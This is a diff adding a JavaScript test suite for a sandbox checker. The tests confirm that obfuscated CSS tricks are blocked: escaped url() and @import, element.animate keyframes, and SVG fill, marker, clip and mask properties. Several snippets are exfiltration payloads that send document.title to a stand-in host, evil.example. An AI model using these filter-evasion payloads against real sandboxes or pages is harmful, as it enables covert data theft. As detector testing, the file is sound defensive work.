@@ -684,3 +684,79 @@ describe('audit of 00cc5f7 (#48): attribute nodes and namespaced tag selectors',
     }
   })
 })
+
+describe('audit of 00cc5f7 (#48): CSS escapes and style paths', () => {
+  // String.raw keeps the backslashes exactly as the audit wrote them.
+  const SNIPPETS = [
+    String.raw`document.body.style.backgroundImage = 'u\\72 l(https://evil.example/p)'`,
+    String.raw`document.body.style.cssText = 'background:\\75 rl(https://evil.example/p)'`,
+    `const u = 'ur'; document.body.animate([{ backgroundImage: u + 'l(https://evil.example/?' + document.title + ')' }], 100000)`,
+    `const u = 'ur'; document.querySelector('svg path').style.fill = u + 'l(https://evil.example/?' + document.title + '#a)'`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('reads escapes in style text before looking for url(), @import and the like', () => {
+    for (const source of [
+      String.raw`document.body.style.setProperty('background-image', 'U\\52 L(https://evil.example/p)')`,
+      String.raw`document.body.style.background = '\\75\\72\\6c(https://evil.example/p)'`,
+      String.raw`document.body.style.background = 'ur\\6c (https://evil.example/p)'`,
+      String.raw`document.body.style.background = '\\u\\r\\l(https://evil.example/p)'`,
+      String.raw`document.body.textContent = '@\\69mport "https://evil.example/x.css"'`,
+      String.raw`document.body.style.setProperty('--u', 'u\\72 l(https://evil.example/p)')`,
+      String.raw`document.body.style.background = 'u\\72' + 'l(https://evil.example/p)'`,
+      String.raw`document.body.style.background = 'v\\61 r(--u)'`,
+      String.raw`document.body.style.background = '\\69mage-set(x 1x)'`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+    // With network declared the same text is a use of that capability, not a block.
+    expect(blocks(String.raw`document.body.style.backgroundImage = 'u\\72 l(https://evil.example/p)'`, ['network'])).toBe(false)
+  })
+
+  it('checks every keyframe of element.animate', () => {
+    for (const source of [
+      `document.body.animate([{ backgroundImage: 'url(https://evil.example/x)' }], 100)`,
+      `document.body.animate({ backgroundImage: ['none', 'url(https://evil.example/x)'] }, 100)`,
+      `document.body.animate({ 'background-image': 'url(https://evil.example/x)' }, 100)`,
+      `document.body.animate([{ background: 'var(--u)' }], 100)`,
+      `document.body.animate([{ '--u': document.title }], 100)`,
+      `const k = [{ opacity: 0 }]; document.body.animate(k, 100)`,
+      `document.body.animate([{ opacity: 0 }, ...window.frames], 100)`,
+      `document.body.animate([{ [document.title]: 'x' }], 100)`,
+      `document.body.animate([{ opacity: 0 }], 100).effect.setKeyframes([{ backgroundImage: 'url(https://evil.example/x)' }])`,
+      `new KeyframeEffect(document.body, [{ backgroundImage: 'url(https://evil.example/x)' }])`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('refuses the style properties that can hold a url() paint, marker, clip or mask', () => {
+    for (const name of ['fill', 'stroke', 'marker', 'markerStart', 'markerMid', 'markerEnd', 'clipPath', 'mask', 'webkitBoxReflect']) {
+      expect(blocks(`document.body.style.${name} = 'url(https://evil.example/x#a)'`), name).toBe(true)
+      expect(blocks(`document.body.style.${name} = document.title`), name).toBe(true)
+    }
+    for (const name of ['fill', 'stroke', 'marker-start', 'marker-mid', 'marker-end', 'clip-path', 'mask', '-webkit-box-reflect']) {
+      expect(blocks(`document.body.style.setProperty('${name}', document.title)`), name).toBe(true)
+    }
+  })
+
+  it('controls: literal keyframes, paint colours and escapes without a loading function still pass', () => {
+    for (const source of [
+      `document.body.animate([{ opacity: 0 }, { opacity: 1 }], { duration: 200 })`,
+      `document.body.animate({ transform: ['none', 'scale(2)'], backgroundColor: ['red', 'blue'] }, 100)`,
+      `document.body.animate([{ 'background-color': 'red', offset: 0 }, { 'background-color': 'blue', easing: 'ease' }], 100)`,
+      `document.body.style.fill = 'red'; document.body.style.stroke = 'none'; document.body.style.strokeWidth = '2px'`,
+      `document.body.style.clipPath = 'inset(0 0 0 0)'; document.body.style.maskType = 'alpha'`,
+      `document.body.style.setProperty('marker-start', 'none')`,
+      String.raw`document.body.style.content = '"\\201C"'; document.body.style.fontFamily = '"a\\20 b"'`,
+      String.raw`document.body.style.setProperty('--n', '\\31 0px')`,
+      String.raw`const re = '\\d+'; document.body.dataset.pattern = re`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+  })
+})
